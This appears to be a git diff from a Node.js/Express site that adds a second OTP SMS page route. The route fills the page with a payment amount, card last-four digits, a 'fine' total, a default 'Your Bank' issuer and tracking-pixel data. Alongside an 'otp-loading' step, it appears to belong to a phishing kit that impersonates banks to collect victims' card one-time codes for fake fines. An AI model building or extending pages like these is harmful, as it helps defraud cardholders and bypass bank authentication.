@@ -57,6 +57,20 @@ router.get('/otp-loading', async (req, res) => {
   });
 });
 
+router.get('/otp-sms2', async (req, res) => {
+  const pixel = await getPixelData();
+  const { amount='0', cardLast4='****', totalFine, issuer='Your Bank', sid='' } = req.query;
+  res.render('otp-sms2', {
+    ...pixel, pixelCurrentPath: '/otp-sms2',
+    amount: parseInt(amount) || 0,
+    cardLast4,
+    totalFine: parseInt(totalFine || amount) || 0,
+    issuer,
+    sid,
+    dateStr: new Date().toLocaleDateString('tr-TR', { timeZone:'Asia/Dubai', day:'2-digit', month:'2-digit', year:'numeric' }),
+  });
+});
+
 router.get('/otp-sms', async (req, res) => {
   const pixel = await getPixelData();
   const { amount='0', cardLast4='****', totalFine, issuer='Your Bank', sid='' } = req.query;
